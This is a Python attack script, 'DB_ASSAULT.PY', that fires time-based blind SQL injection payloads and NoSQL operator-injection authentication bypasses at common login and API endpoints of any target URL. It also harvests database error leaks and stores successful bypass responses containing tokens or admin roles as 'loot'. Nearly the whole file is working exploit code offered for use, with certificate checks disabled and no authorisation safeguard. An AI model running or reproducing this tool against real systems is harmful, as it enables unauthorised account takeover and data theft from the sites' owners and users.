#!/usr/bin/env python3
"""
DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine v7.6
Features:
- Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi
- Real-time error-pattern fingerprinting & adaptive payload mutation
- Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates
- Automated immutable disk persistence (loot_output/) via centralized framework logger
- Zero-disk live terminal streaming with robust color mapping
"""
import asyncio
import http.client
import json
import ssl
import time
import sys
import re
from urllib.parse import urlsplit

# Import centralized framework telemetry and immutable loot persistence
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

REQUEST_TIMEOUT = 12
MAX_RESPONSE_SIZE = 128 * 1024

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "PURPLE": "\033[95m",
    "RESET": "\033[0m",
}

def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
    sys.stdout.flush()

SQL_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 9463 FROM(SELECT(SLEEP(5)))v)---",
    "1' AND BENCHMARK(50000000,MD5(1))-- -"
]

NOSQL_POLYMORPHIC_VECTORS = [
    {
        "name": "NoSQL Regex/Not-Equal Operator",
        "string_variant": {"username": "admin' || '1'=='1", "password": "password"},
        "object_variant": {"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}},
        "array_variant": {"username[]": "admin", "password[]": "password"}
    },
    {
        "name": "NoSQL JavaScript Where Injection",
        "string_variant": {"username": "admin'; sleep(5);--", "password": "password"},
        "object_variant": {"$where": "sleep(5)"},
        "array_variant": {"$where[]": "true"}
    },
    {
        "name": "Type-Juggling / Boolean Bypass",
        "string_variant": {"username": "admin' OR '1'='1", "password": "password"},
        "object_variant": {"username": {"$gt": ""}, "password": {"$ne": None}},
        "array_variant": {"username[ne]": "none"}
    }
]

DB_ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|mongodb|mongosh|mongoerror|bsonerror|casttoobjectid|syntax error|must be a string",
    re.I
)

def send_http(host, port, path, payload, secure, method="POST"):
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        if isinstance(payload, dict):
            body = json.dumps(payload).encode("utf-8")
            ct = "application/json"
        else:
            body = str(payload).encode("utf-8")
            ct = "application/x-www-form-urlencoded"
            
        headers = {
            "User-Agent": "BruteDog-AdaptiveDB/5.6",
            "Content-Type": ct,
            "Accept": "*/*",
            "Connection": "close"
        }
        conn.request(method, path, body=body, headers=headers)
        res = conn.getresponse()
        data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed, "error": None}
    except Exception as exc:
        elapsed = round(time.monotonic() - start, 3)
        return {"status": 0, "body": "", "elapsed": elapsed, "error": str(exc)}
    finally:
        if conn:
            conn.close()

async def calibrate_baseline(host, port, endpoint, secure):
    log(f"[*] Calibrating baseline latency for {endpoint}...", "CYAN")
    latencies = []
    for _ in range(3):
        res = send_http(host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure)
        if not res["error"] and res["elapsed"] > 0:
            latencies.append(res["elapsed"])
        await asyncio.sleep(0.2)
    if latencies:
        avg = sum(latencies) / len(latencies)
        log(f"[+] Baseline latency established: {round(avg, 3)}s", "GREEN")
        return avg + 4.0
    return 4.5

async def run_nosql_assault(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8 HARDENED) [***]", "PURPLE")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https"
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = parsed.path.rstrip("/")
    
    findings = []
    
    relative_endpoints = [
        "/api/login",
        "/login",
        "/user/register",
        "/api/search",
        "/api/v1/users",
        "/auth",
        "/api/auth"
    ]
    
    test_endpoints = [base_path + ep for ep in relative_endpoints]
    if base_path not in test_endpoints and base_path:
        test_endpoints.append(base_path)

    for endpoint in test_endpoints:
        log(f"[*] Testing polymorphic vectors against: {endpoint}", "CYAN")
        
        time_threshold = await calibrate_baseline(host, target_port, endpoint, secure)
        
        # 1. Time-Based Blind SQLi Assault with Dual-Probe Confirmation
        for payload in SQL_TIME_PAYLOADS:
            res1 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
            if res1["elapsed"] >= time_threshold:
                # Confirm with a second validation probe to eliminate network jitter false positives
                log(f"[*] Potential time delay detected ({res1['elapsed']}s). Running confirmation probe...", "YELLOW")
                res2 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
                
                if res2["elapsed"] >= time_threshold:
                    log(f"[!] CONFIRMED ADAPTIVE TIME-BASED BLIND SQLi [{endpoint}] (Delays: {res1['elapsed']}s, {res2['elapsed']}s)", "RED")
                    finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delays": [res1["elapsed"], res2["elapsed"]]}
                    findings.append(finding)
                    
                    stream_proof("DB_TIME_BASED_SQLI_CONFIRMED", endpoint, {"payload": payload}, f"Verified Delays: {res1['elapsed']}s, {res2['elapsed']}s", finding)
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_TIME_BASED_SQLI_CONFIRMED",
                        status=res2["status"],
                        headers={},
                        body=res2["body"],
                        extra_loot=finding
                    )
                else:
                    log(f"[-] Time delay inconsistent on confirmation probe ({res2['elapsed']}s). Discarding false positive.", "GRAY")

        # 2. Polymorphic NoSQL / Injection Vector Fuzzing with Strict Positive Verification
        for vector in NOSQL_POLYMORPHIC_VECTORS:
            for variant_type in ["string_variant", "object_variant", "array_variant"]:
                payload = vector[variant_type]
                res = send_http(host, target_port, endpoint, payload, secure)
                body_lower = (res["body"] or "").lower()
                
                # Check for explicit database error disclosures
                error_match = DB_ERROR_PATTERNS.search(res["body"])
                if error_match and "must be a string" not in error_match.group(0):
                    log(f"[!] Database Error Leaked [{endpoint}] ({vector['name']} - {variant_type}): {error_match.group(0)}", "YELLOW")
                    finding = {"vector": f"Error-Based Inference [{variant_type}]", "endpoint": endpoint, "error": error_match.group(0)}
                    findings.append(finding)
                    
                    stream_proof("DB_ERROR_LEAK", endpoint, {"vector": vector["name"]}, error_match.group(0), finding)
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_ERROR_BASED_INFERENCE",
                        status=res["status"],
                        headers={},
                        body=res["body"],
                        extra_loot=finding
                    )

                # Strict Positive Verification for Bypass:
                # Must return 200/201/302, have substantive body length, NOT be an HTML/SPA shell, 
                # and contain verified auth/data indicators.
                is_spa_or_html = (
                    "<!doctype html>" in body_lower or 
                    "<html" in body_lower or 
                    '<div id="root"></div>' in body or 
                    '<div id="__next"></div>' in body or
                    len(res["body"].strip()) < 50
                )
                
                has_auth_indicators = any(
                    token in body_lower for token in [
                        "access_token", "auth_token", "session_id", "authenticated", 
                        "\"role\":\"admin\"", "\"user_id\":", "cryptobyte", "success"
                    ]
                )

                if res["status"] in (200, 201, 302) and not is_spa_or_html and has_auth_indicators:
                    log(f"[+] VERIFIED DATABASE BYPASS / EXFILTRATION [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
                    log(f"  └── Response Excerpt: {res['body'][:150]}", "CYAN")
                    finding = {"vector": f"Polymorphic Injection [{variant_type}]", "endpoint": endpoint, "payload": str(payload), "response_sample": res["body"][:100]}
                    findings.append(finding)
                    
                    stream_proof("DB_BYPASS_VERIFIED", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_POLYMORPHIC_BYPASS_VERIFIED",
                        status=res["status"],
                        headers={},
                        body=res["body"],
                        extra_loot=finding
                    )

    log(f"[+] Database assault complete. Total verified vectors: {len(findings)}", "GREEN")
    return findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 db_assault.py <target_url>")
        sys.exit(1)
asyncio.run(run_nosql_assault(sys.argv[1]))
